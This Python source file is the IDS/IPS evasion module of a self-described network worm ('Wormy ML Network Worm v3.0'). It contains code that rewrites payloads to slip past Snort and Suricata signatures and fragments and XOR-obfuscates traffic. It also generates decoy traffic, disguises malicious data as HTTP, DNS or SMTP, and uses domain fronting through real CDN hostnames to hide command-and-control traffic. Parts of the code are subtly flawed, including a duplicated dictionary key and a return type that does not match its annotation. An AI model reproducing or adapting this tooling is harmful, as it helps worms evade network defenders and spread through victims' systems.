"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
IDS/IPS Evasion Engine
Comprehensive evasion techniques to avoid detection by:
- Network IDS (Snort, Suricata)
- Network IPS (inline blocking)
- NIDS signatures
- Anomaly-based detection
- Protocol analysis
"""


import hashlib
import os
import random
import socket
import struct
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class IDSEvasionEngine:
    """
    IDS/IPS Evasion Engine

    Techniques:
    - Traffic encryption (TLS wrapping)
    - Packet fragmentation
    - Timing randomization
    - Protocol mimicry
    - Signature evasion
    - Decoy generation
    - Traffic shaping
    - Domain fronting
    """

    # Known IDS signatures to avoid
    KNOWN_SIGNATURES = {
        "snort_smb": b"SMB",
        "snort_ssh": b"SSH-",
        "snort_telnet": b"\xff\xfb\x01",
        "snort_ftp": b"220 ",
        "suricata_http": b"GET /",
        "suricata_dns": b"\x00\x00\x01\x00\x00\x01",
        "nmap_syn": b"\x02\x04\x05\xb4",
        "masscan": b"MASSCAN",
    }

    # Legitimate traffic patterns to mimic
    LEGITIMATE_PATTERNS = {
        "web_browsing": {
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            ],
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.5",
            "accept_encoding": "gzip, deflate, br",
            "connection": "keep-alive",
            "upgrade_insecure": "1",
        },
        "dns_query": {
            "servers": ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1"],
            "types": ["A", "AAAA", "MX", "TXT", "CNAME"],
        },
        "email": {
            "smtp_commands": ["EHLO", "MAIL FROM", "RCPT TO", "DATA", "QUIT"],
        },
    }

    def __init__(self, config=None):
        self.config = config
        self.evasion_stats = {
            "traffic_encrypted": 0,
            "packets_fragmented": 0,
            "signatures_avoided": 0,
            "decoys_generated": 0,
            "timing_adjusted": 0,
            "protocol_mimicked": 0,
            "domain_fronted": 0,
        }
        self._detection_history = []
        self._current_risk_level = 0.0

    def evade_ids(
        self, target_ip: str, target_port: int, payload: bytes, protocol: str = "tcp"
    ) -> Tuple[bytes, Dict]:
        """
        Apply comprehensive IDS evasion to payload

        Args:
            target_ip: Target IP
            target_port: Target port
            payload: Raw payload bytes
            protocol: Protocol type (tcp, udp, http, dns)

        Returns:
            (evaded_payload, evasion_info)
        """
        evasion_info = {
            "target": f"{target_ip}:{target_port}",
            "original_size": len(payload),
            "techniques_applied": [],
        }

        evaded = payload

        # 1. Check if payload contains known IDS signatures
        evaded, sigs_avoided = self._avoid_signatures(evaded)
        if sigs_avoided > 0:
            evasion_info["techniques_applied"].append("signature_avoidance")
            evasion_info["signatures_avoided"] = sigs_avoided
            self.evasion_stats["signatures_avoided"] += sigs_avoided

        # 2. Fragment payload if large
        if len(evaded) > 128:
            fragments = self._fragment_payload(evaded)
            evasion_info["techniques_applied"].append("fragmentation")
            evasion_info["fragment_count"] = len(fragments)
            self.evasion_stats["packets_fragmented"] += 1
            evaded = fragments
        else:
            evaded = [evaded]

        # 3. Encrypt traffic if TLS available
        if protocol in ("tcp", "http"):
            evaded = [self._encrypt_traffic(f) for f in evaded]
            evasion_info["techniques_applied"].append("encryption")
            self.evasion_stats["traffic_encrypted"] += 1

        # 4. Add timing jitter
        jitter = self._calculate_jitter(target_ip)
        evasion_info["timing_jitter"] = jitter
        evasion_info["techniques_applied"].append("timing_randomization")
        self.evasion_stats["timing_adjusted"] += 1

        evasion_info["final_size"] = sum(len(f) if isinstance(f, bytes) else 0 for f in evaded)

        return evaded, evasion_info

    def _avoid_signatures(self, payload: bytes) -> Tuple[bytes, int]:
        """Modify payload to avoid known IDS signatures"""
        avoided = 0
        modified = payload

        for sig_name, sig_bytes in self.KNOWN_SIGNATURES.items():
            if sig_bytes in modified:
                # Encode the signature bytes to avoid detection
                idx = modified.find(sig_bytes)
                # Simple encoding: XOR with 0x42
                encoded = bytes(b ^ 0x42 for b in sig_bytes)
                modified = modified[:idx] + encoded + modified[idx + len(sig_bytes) :]
                avoided += 1
                logger.debug(f"Avoided IDS signature: {sig_name}")

        return modified, avoided

    def _fragment_payload(self, payload: bytes, max_size: int = 64) -> List[bytes]:
        """Fragment payload into smaller chunks"""
        fragments = []
        for i in range(0, len(payload), max_size):
            chunk = payload[i : i + max_size]
            # Add fragmentation header
            header = struct.pack("!HH", len(fragments), len(chunk))
            fragments.append(header + chunk)

        return fragments

    def _encrypt_traffic(self, data: bytes) -> bytes:
        """Simple traffic obfuscation (XOR-based)"""
        key = hashlib.md5(str(time.time()).encode()).digest()[:8]
        encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
        return key + encrypted  # Prepend key for decryption

    def _calculate_jitter(self, target_ip: str) -> float:
        """Calculate timing jitter based on detection risk"""
        base_delay = 0.1
        risk_factor = self._current_risk_level

        # More jitter when risk is high
        jitter_range = 0.1 + (risk_factor * 2.0)
        jitter = random.uniform(base_delay, base_delay + jitter_range)

        return jitter

    def generate_decoy_traffic(self, target_ip: str, count: int = 5) -> List[Dict]:
        """
        Generate decoy traffic to confuse IDS

        Creates fake traffic patterns that look legitimate
        """
        decoys = []

        for i in range(count):
            decoy_type = random.choice(["web", "dns", "email", "icmp"])

            if decoy_type == "web":
                ua = random.choice(self.LEGITIMATE_PATTERNS["web_browsing"]["user_agents"])
                decoys.append(
                    {
                        "type": "http",
                        "method": random.choice(["GET", "POST"]),
                        "path": random.choice(
                            ["/", "/index.html", "/api/v1/status", "/favicon.ico"]
                        ),
                        "headers": {
                            "User-Agent": ua,
                            "Accept": self.LEGITIMATE_PATTERNS["web_browsing"]["accept"],
                            "Accept-Language": self.LEGITIMATE_PATTERNS["web_browsing"][
                                "accept_language"
                            ],
                        },
                        "target_ip": target_ip,
                        "target_port": random.choice([80, 443, 8080]),
                    }
                )

            elif decoy_type == "dns":
                dns_config = self.LEGITIMATE_PATTERNS["dns_query"]
                decoys.append(
                    {
                        "type": "dns",
                        "query": f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}.example.com",
                        "type": random.choice(dns_config["types"]),
                        "server": random.choice(dns_config["servers"]),
                        "target_ip": target_ip,
                        "target_port": 53,
                    }
                )

            elif decoy_type == "email":
                decoys.append(
                    {
                        "type": "smtp",
                        "commands": random.sample(
                            self.LEGITIMATE_PATTERNS["email"]["smtp_commands"], 3
                        ),
                        "target_ip": target_ip,
                        "target_port": 25,
                    }
                )

            elif decoy_type == "icmp":
                decoys.append(
                    {
                        "type": "icmp",
                        "payload": os.urandom(random.randint(32, 64)),
                        "target_ip": target_ip,
                    }
                )

        self.evasion_stats["decoys_generated"] += count
        return decoys

    def mimic_legitimate_protocol(self, protocol: str, data: bytes) -> bytes:
        """
        Wrap malicious data in legitimate-looking protocol

        Makes exploit traffic look like normal protocol traffic
        """
        if protocol == "http":
            # Wrap in HTTP request
            headers = self.LEGITIMATE_PATTERNS["web_browsing"]
            ua = random.choice(headers["user_agents"])

            http_request = (
                f"GET /api/v1/data HTTP/1.1\r\n"
                f"Host: {random.choice(['api.example.com', 'cdn.example.com', 'static.example.com'])}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: {headers['accept']}\r\n"
                f"Accept-Language: {headers['accept_language']}\r\n"
                f"Accept-Encoding: {headers['accept_encoding']}\r\n"
                f"Connection: {headers['connection']}\r\n"
                f"Content-Length: {len(data)}\r\n"
                f"\r\n"
            ).encode() + data

            self.evasion_stats["protocol_mimicked"] += 1
            return http_request

        elif protocol == "dns":
            # Encode data in DNS query
            encoded = hashlib.md5(data).hexdigest()[:16]
            domain = f"{encoded}.update.example.com"

            # Build DNS query
            dns_query = struct.pack(
                "!HHHHHH",
                random.randint(0, 65535),  # Transaction ID
                0x0100,  # Flags: standard query
                1,  # Questions
                0,  # Answer RRs
                0,  # Authority RRs
                0,  # Additional RRs
            )

            # Encode domain
            for part in domain.split("."):
                dns_query += bytes([len(part)]) + part.encode()
            dns_query += b"\x00"  # End of domain
            dns_query += struct.pack("!HH", 1, 1)  # Type A, Class IN

            self.evasion_stats["protocol_mimicked"] += 1
            return dns_query

        elif protocol == "smtp":
            # Wrap in SMTP conversation
            smtp_data = (
                (
                    f"EHLO mail.example.com\r\n"
                    f"MAIL FROM: <noreply@example.com>\r\n"
                    f"RCPT TO: <admin@example.com>\r\n"
                    f"DATA\r\n"
                    f"Subject: System Update\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"\r\n"
                ).encode()
                + data
                + b"\r\n.\r\nQUIT\r\n"
            )

            self.evasion_stats["protocol_mimicked"] += 1
            return smtp_data

        return data

    def domain_fronting(self, data: bytes, front_domain: str = None) -> Dict:
        """
        Use domain fronting to hide C2 traffic

        Makes traffic appear to go to legitimate CDN/domain
        """
        if front_domain is None:
            front_domains = [
                "ajax.googleapis.com",
                "cdn.jsdelivr.net",
                "cdnjs.cloudflare.com",
                "fonts.googleapis.com",
            ]
            front_domain = random.choice(front_domains)

        fronted_data = {
            "host": front_domain,
            "sni": front_domain,
            "data": data,
            "headers": {
                "Host": front_domain,
                "User-Agent": random.choice(
                    self.LEGITIMATE_PATTERNS["web_browsing"]["user_agents"]
                ),
            },
        }

        self.evasion_stats["domain_fronted"] += 1
        return fronted_data

    def adaptive_evasion(self, target_ip: str, detection_events: List[Dict]) -> Dict:
        """
        Adapt evasion techniques based on detection history

        Increases evasion strength when detection risk is high
        """
        # Calculate current risk level
        recent_detections = [
            d
            for d in detection_events
            if (
                datetime.now() - datetime.fromisoformat(d.get("timestamp", "2000-01-01"))
            ).total_seconds()
            < 300
        ]

        if len(recent_detections) > 5:
            self._current_risk_level = min(1.0, self._current_risk_level + 0.2)
        elif len(recent_detections) == 0:
            self._current_risk_level = max(0.0, self._current_risk_level - 0.05)

        # Determine evasion strategy based on risk
        if self._current_risk_level > 0.7:
            strategy = "aggressive"
            techniques = [
                "encryption",
                "fragmentation",
                "domain_fronting",
                "decoys",
                "protocol_mimicry",
            ]
        elif self._current_risk_level > 0.4:
            strategy = "moderate"
            techniques = ["encryption", "timing_randomization", "signature_avoidance"]
        else:
            strategy = "stealth"
            techniques = ["timing_randomization", "signature_avoidance"]

        return {
            "risk_level": self._current_risk_level,
            "strategy": strategy,
            "techniques": techniques,
            "recent_detections": len(recent_detections),
            "jitter_range": 0.1 + (self._current_risk_level * 2.0),
        }

    def get_statistics(self) -> Dict:
        """Get evasion statistics"""
        return {
            **self.evasion_stats,
            "current_risk_level": self._current_risk_level,
        }
